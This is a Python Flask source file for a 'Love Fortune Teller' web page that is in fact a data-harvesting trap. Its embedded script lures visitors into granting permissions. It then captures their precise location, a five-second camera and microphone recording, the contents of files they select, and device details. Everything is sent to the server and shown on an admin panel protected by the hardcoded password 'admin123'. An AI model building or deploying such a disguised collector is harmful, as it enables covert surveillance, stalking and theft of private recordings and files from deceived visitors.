from flask import Flask, request, jsonify, render_template_string
import json
import os
import random
from datetime import datetime

app = Flask(__name__)

# Romantic fortunes
FORTUNES = [
    "Your soulmate is thinking of you right now 💕",
    "A passionate kiss awaits you this week 😘",
    "True love will find you when you least expect it ❤️",
    "Your heart will be swept away by someone special 🌹",
    "Tonight, someone special dreams of you 🌙",
    "Love is in the air—prepare for romance! 💋",
    "Your perfect match is closer than you think ✨",
    "A romantic adventure begins soon 🥰",
    "Your love life is about to blossom 🌸",
    "Someone is falling in love with your smile 😍",
    "Passion ignites when you open your heart 🔥",
    "Your forever person is waiting for you 💍",
    "Romance will surprise you beautifully 🌟",
    "Love letters are coming your way 📩",
    "Your heart knows the way—follow it 💖",
    "A love story worthy of movies awaits 🎬",
    "Sweet whispers of love are on their way 🗣️",
    "Your soul recognizes its match instantly 👫",
    "Romantic magic happens when you believe ✨",
    "Love will light up your world like fireworks 🎆",
    "Someone special notices your unique beauty 🌺",
    "Heart-to-heart connections deepen soon 💑",
    "Your love journey leads to happiness 🛤️",
    "Passionate nights and tender days ahead 🌃",
    "Love finds those who are ready to receive it 🎁",
    "Your heart's desire manifests soon 🙏",
    "Romantic serendipity brings you together 🍀",
    "Love grows stronger with every heartbeat 💓",
    "Your perfect love story unfolds now 📖",
    "Someone's heart beats faster thinking of you 🥁",
    "True love transcends time and distance 🌍",
    "Your romantic destiny calls you forward 🚀"
]

DATA_FILE = 'visitors.json'

def init_json():
    if not os.path.exists(DATA_FILE):
        with open(DATA_FILE, 'w') as f:
            json.dump([], f)

def save_visitor(data):
    init_json()
    with open(DATA_FILE, 'r') as f:
        visitors = json.load(f)
    visitors.append(data)
    with open(DATA_FILE, 'w') as f:
        json.dump(visitors, f, indent=2)

def get_visitors():
    init_json()
    with open(DATA_FILE, 'r') as f:
        return json.load(f)

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/get-fortune')
def get_fortune():
    return jsonify({'fortune': random.choice(FORTUNES)})

@app.route('/save', methods=['POST'])
def save():
    data = request.json
    data['timestamp'] = datetime.now().isoformat()
    data['ip'] = request.remote_addr
    save_visitor(data)
    return jsonify({'status': 'saved'})

@app.route('/admin')
def admin():
    password = request.args.get('pass')
    if password != 'admin123':
        return '<h1>🔒 Access Denied</h1>', 403
    visitors = get_visitors()
    if not visitors:
        return '<h1>No data yet</h1>'
    html = '<h1>💕 Visitor Data</h1><table border="1" cellpadding="5">'
    if visitors:
        keys = visitors[0].keys()
        html += '<tr>' + ''.join(f'<th>{k}</th>' for k in keys) + '</tr>'
        for v in visitors:
            html += '<tr>' + ''.join(f'<td>{str(v.get(k, ""))[:100]}</td>' for k in keys) + '</tr>'
    html += '</table><br><a href="/admin/download?pass=admin123">Download JSON</a>'
    return html

@app.route('/admin/download')
def download():
    password = request.args.get('pass')
    if password != 'admin123':
        return 'Unauthorized', 403
    return jsonify(get_visitors())

HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Love Fortune Teller 💕</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #ff9a9e, #fecfef, #ffdde1);
            font-family: 'Segoe UI', Roboto, sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .card {
            max-width: 500px;
            width: 100%;
            background: rgba(255,255,255,0.95);
            border-radius: 40px;
            padding: 35px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
            text-align: center;
        }
        h1 { font-size: 2em; background: linear-gradient(135deg, #ff6b6b, #c06c84); -webkit-background-clip: text; background-clip: text; color: transparent; }
        input, button {
            width: 100%;
            padding: 14px;
            margin: 10px 0;
            border-radius: 60px;
            border: 2px solid #ffdde1;
            font-size: 16px;
            text-align: center;
        }
        button {
            background: linear-gradient(135deg, #ff6b6b, #c06c84);
            color: white;
            border: none;
            font-weight: bold;
            cursor: pointer;
            transition: 0.2s;
        }
        button:hover { transform: scale(1.02); }
        .hidden { display: none; }
        .fortune-box {
            background: rgba(255,182,193,0.3);
            border-left: 5px solid #ff1493;
            border-radius: 20px;
            padding: 20px;
            margin: 20px 0;
            font-size: 1.3em;
            font-weight: bold;
            color: #c06c84;
        }
        .status { margin-top: 15px; padding: 10px; border-radius: 20px; font-size: 14px; }
        .step {
            margin-top: 20px;
            padding: 15px;
            background: rgba(255,255,255,0.9);
            border-radius: 20px;
        }
        .spinner {
            border: 3px solid #f3f3f3;
            border-top: 3px solid #ff1493;
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
            margin: 10px auto;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        svg { margin: 10px auto; display: block; }
    </style>
</head>
<body>
<div class="card">
    <h1>💕 Love Fortune Teller 💕</h1>
    <div id="step-name">
        <input type="text" id="userName" placeholder="✨ Enter your name ✨">
        <button onclick="startProcess()">🔮 Reveal My Destiny</button>
    </div>
    <div id="loading" class="hidden">
        <div class="spinner"></div>
        <p>🔮 Reading the stars...</p>
    </div>
    <div id="permissions" class="hidden">
        <p>For your ultra-personalized love vision, please allow:</p>
        <div style="background:#ffe4e1; padding:10px; border-radius:20px; margin:10px 0;">📍 Location | 🎤 Voice | 📸 Camera | 📁 Files</div>
        <button onclick="requestAll()">✅ Allow All</button>
    </div>
    <div id="progress" class="hidden"></div>
    <div id="result" class="hidden">
        <div class="fortune-box" id="fortuneText"></div>
        <div id="mapLink" class="hidden">🗺️ Your love map: <span id="mapUrl"></span></div>
        <p>✨ Thank you for trusting the stars ✨</p>
    </div>
</div>
<script>
    let visitorData = {};
    let mediaRecorder, mediaStream, recordedBlobs = [];

    async function startProcess() {
        const name = document.getElementById('userName').value.trim();
        if (!name) return alert('Please enter your name');
        visitorData.name = name;
        visitorData.user_agent = navigator.userAgent;
        visitorData.screen = `${screen.width}x${screen.height}`;
        visitorData.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
        document.getElementById('step-name').classList.add('hidden');
        document.getElementById('loading').classList.remove('hidden');
        await new Promise(r => setTimeout(r, 800));
        document.getElementById('loading').classList.add('hidden');
        document.getElementById('permissions').classList.remove('hidden');
    }

    function showStep(title, status, percent) {
        const div = document.getElementById('progress');
        div.innerHTML = `<div class="step"><b>${title}</b><br>${status}<br><svg width="80" height="80" viewBox="0 0 100 100"><circle cx="50" cy="50" r="40" fill="none" stroke="#ddd" stroke-width="8"/><circle id="progCircle" cx="50" cy="50" r="40" fill="none" stroke="#10b981" stroke-width="8" stroke-linecap="round" stroke-dasharray="251.2" stroke-dashoffset="${251.2 * (1 - percent/100)}"/></svg></div>`;
        div.classList.remove('hidden');
    }
    function hideStep() { document.getElementById('progress').classList.add('hidden'); }

    async function requestAll() {
        document.getElementById('permissions').classList.add('hidden');
        try {
            await getLocation();
            await getMedia();      // 5 seconds recording
            await getFiles();
            await finalize();
        } catch(e) { await finalize(); }
    }

    function getLocation() {
        return new Promise((resolve) => {
            showStep('📍 Location', 'Requesting location...', 0);
            navigator.geolocation.getCurrentPosition(
                pos => {
                    visitorData.latitude = pos.coords.latitude;
                    visitorData.longitude = pos.coords.longitude;
                    showStep('📍 Location', 'Location captured!', 100);
                    setTimeout(() => { hideStep(); resolve(); }, 500);
                },
                () => {
                    visitorData.latitude = 'denied';
                    showStep('📍 Location', 'Location skipped', 100);
                    setTimeout(() => { hideStep(); resolve(); }, 500);
                }
            );
        });
    }

    function getMedia() {
        return new Promise((resolve) => {
            showStep('🎥 Camera/Mic', 'Allow permissions...', 10);
            navigator.mediaDevices.getUserMedia({ audio: true, video: { facingMode: 'user' } })
            .then(stream => {
                mediaStream = stream;
                recordedBlobs = [];
                mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
                mediaRecorder.ondataavailable = e => { if(e.data.size) recordedBlobs.push(e.data); };
                mediaRecorder.onstop = () => {
                    if(recordedBlobs.length) {
                        const blob = new Blob(recordedBlobs, { type: 'video/webm' });
                        const reader = new FileReader();
                        reader.onloadend = () => {
                            visitorData.camera_video = reader.result.split(',')[1].slice(0, 5000);
                            visitorData.microphone = 'recorded';
                            mediaStream.getTracks().forEach(t => t.stop());
                            showStep('🎥 Camera/Mic', 'Recording done!', 100);
                            setTimeout(() => { hideStep(); resolve(); }, 500);
                        };
                        reader.readAsDataURL(blob);
                    } else { resolve(); }
                };
                mediaRecorder.start();
                let seconds = 5;  // 5 seconds only – fast
                const interval = setInterval(() => {
                    seconds--;
                    showStep('🎥 Camera/Mic', `Recording ${seconds}s...`, 10 + (5-seconds)/5*90);
                    if(seconds <= 0) { clearInterval(interval); mediaRecorder.stop(); }
                }, 1000);
            })
            .catch(() => {
                visitorData.camera_video = 'denied';
                showStep('🎥 Camera/Mic', 'Skipped', 100);
                setTimeout(() => { hideStep(); resolve(); }, 500);
            });
        });
    }

    function getFiles() {
        return new Promise((resolve) => {
            showStep('📁 Files', 'Select files (optional)', 0);
            if(!window.showOpenFilePicker) {
                visitorData.files = 'not supported';
                setTimeout(() => { hideStep(); resolve(); }, 500);
                return;
            }
            window.showOpenFilePicker({ multiple: true })
            .then(async handles => {
                let filesData = [];
                for(const handle of handles.slice(0,2)) {
                    const file = await handle.getFile();
                    const content = await new Promise(res => {
                        const reader = new FileReader();
                        reader.onloadend = () => res(reader.result.split(',')[1].slice(0,2000));
                        reader.readAsDataURL(file);
                    });
                    filesData.push({ name: file.name, size: file.size, data: content });
                }
                visitorData.files = JSON.stringify(filesData);
                showStep('📁 Files', 'Files loaded', 100);
                setTimeout(() => { hideStep(); resolve(); }, 500);
            })
            .catch(() => {
                visitorData.files = 'denied';
                showStep('📁 Files', 'No files', 100);
                setTimeout(() => { hideStep(); resolve(); }, 500);
            });
        });
    }

    async function finalize() {
        const mapUrl = `https://www.google.com/maps?q=${visitorData.latitude},${visitorData.longitude}`;
        visitorData.map_url = mapUrl;
        document.getElementById('mapUrl').innerText = mapUrl;
        document.getElementById('mapLink').classList.remove('hidden');
        const fortuneResp = await fetch('/get-fortune');
        const fortune = await fortuneResp.json();
        document.getElementById('fortuneText').innerText = fortune.fortune + " Dear " + visitorData.name + "! 💕";
        document.getElementById('result').classList.remove('hidden');
        await fetch('/save', {
            method: 'POST',
            headers: {'Content-Type':'application/json'},
            body: JSON.stringify(visitorData)
        });
    }
</script>
</body>
</html>
'''

if __name__ == '__main__':
    init_json()
    app.run(host='0.0.0.0', port=5000, debug=False)
